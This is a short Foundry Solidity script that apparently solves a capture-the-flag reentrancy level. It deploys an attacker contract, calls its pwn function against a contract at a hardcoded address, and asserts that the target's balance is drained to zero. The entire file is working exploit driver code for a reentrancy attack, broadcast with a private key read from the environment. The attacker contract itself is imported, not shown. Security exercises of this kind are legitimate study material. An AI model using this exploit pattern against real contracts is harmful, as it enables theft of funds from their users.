// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import {Reentrance} from "../src/re-entrancy/Reentrance.sol";
import {Reentrant} from "../src/re-entrancy/Reentrant.sol";

contract ReentranceScript is Script {
    uint256 playerKey;
    address playerAddr;
    Reentrance reentrance;

    function setUp() public {
        reentrance = Reentrance(
            payable(0x8C423d815992070F84A6C141F1eDe85a915cb361)
        );
        playerKey = vm.envUint("PRIVATE_KEY");
        playerAddr = vm.addr(playerKey);
    }

    function run() public {
        vm.startBroadcast(playerKey);
        Reentrant reentrant = new Reentrant();
        uint256 balance = address(reentrance).balance;
        assert(balance > 0);

        reentrant.pwn{value: balance}(reentrance);

        assert(address(reentrance).balance == 0);
    }
}
